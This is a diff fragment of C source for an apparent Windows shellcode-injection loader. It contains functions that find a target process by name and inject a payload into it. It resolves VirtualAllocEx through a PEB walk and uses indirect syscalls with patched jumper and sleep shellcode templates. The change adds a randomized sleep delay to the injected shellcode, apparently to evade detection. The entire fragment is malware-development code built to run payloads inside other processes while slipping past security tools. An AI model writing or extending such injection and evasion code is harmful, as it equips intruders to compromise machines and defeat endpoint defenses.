@@ -7,6 +7,8 @@
 #include "peb-lookup.h"
 #include "func-prototype.h"
 #include "sysheaders.h"
+#include <stdlib.h>
+
 DWORD FindPIDByName(wchar_t* processName) {
     HANDLE hProcessSnap;
     PROCESSENTRY32 pe32;
@@ -165,6 +167,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
     // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
     pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);
+
     LPVOID jumper = _VirtualAllocEx(hProcess, NULL, jumper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     LPVOID checkmem = _VirtualAllocEx(hProcess, NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
@@ -218,6 +221,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     DWORD syscall_num = (DWORD)SW2_GetSyscallNumber(0x0F0280552);
     DWORD64 syscall_addr = (DWORD64) SW2_GetRandomSyscallAddress();
     
+    DWORD randomsleeptime = (rand() % 10) + 5;
 
     //printf("[+] Target syscall number: %d")
 
@@ -227,12 +231,13 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     *((DWORD64*)(&(jumperTemplate[0x2f]))) = syscall_addr;
     *((DWORD*)(&(jumperTemplate[0x3c]))) = syscall_num;
     *((DWORD64*)(&(jumperTemplate[0x55]))) = (DWORD64)mem;
-
+    
     //*((DWORD64 *)(&(jumperTemplate[0x27]))) = (DWORD64) _CreateThread;
     //*((DWORD64 *)(&(jumperTemplate[0x37]))) = (DWORD64) mem;
 
 
     *((DWORD64 *)(&(sleepshellcode[0x2]))) = (DWORD64) _Sleep;
+    *((DWORD*)(&(sleepshellcode[0xd]))) = (DWORD)(randomsleeptime * 1000);
     #endif
 
 
